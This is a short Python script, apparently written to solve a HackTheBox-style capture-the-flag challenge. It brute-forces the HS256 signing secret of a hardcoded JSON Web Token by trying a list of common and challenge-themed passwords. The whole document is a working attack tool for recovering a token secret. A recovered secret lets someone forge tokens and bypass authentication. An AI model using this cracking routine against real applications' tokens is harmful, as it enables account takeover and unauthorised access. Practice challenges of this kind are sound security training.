import jwt
import sys

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImMwODUyZmZmLWM5YTktNGI1Yy1hNDkwLTc3ZDUzZjQ2ZmVjZCIsImVtYWlsIjoiaGFja2VyX2I5YzYyNTdhLTk4MGMtNGU3Yy1iMGZmLTdjZDA1YzI3NDMxM0B0ZXN0LmNvbSIsImlhdCI6MTc2MzgyNDg3NCwiZXhwIjoxNzYzODI1Nzc0fQ.k1AXmNgQjClkweDKUNGrMPvfQxS5mhGYeYvBEqiXuTc"

candidates = [
    "secret", "password", "123456", "admin", "root", "user", "hackthebox", "htb",
    "celestial", "scribe", "securenotes", "secure", "notes", "app", "mobile",
    "CelestialScribe", "SecureNotes", "HTB", "test", "key", "token", "api",
    "dev", "development", "prod", "production", "jwt", "json", "auth", "login",
    "hack", "flag", "challenge", "android", "apk", "keystore", "sign",
    "private", "public", "default", "12345", "12345678", "qwerty", "letmein"
]

print("Cracking JWT...")
for secret in candidates:
    try:
        jwt.decode(token, secret, algorithms=["HS256"])
        print(f"FOUND SECRET: {secret}")
        sys.exit(0)
    except jwt.exceptions.InvalidSignatureError:
        continue
    except Exception as e:
        print(e)

print("Failed to crack.")
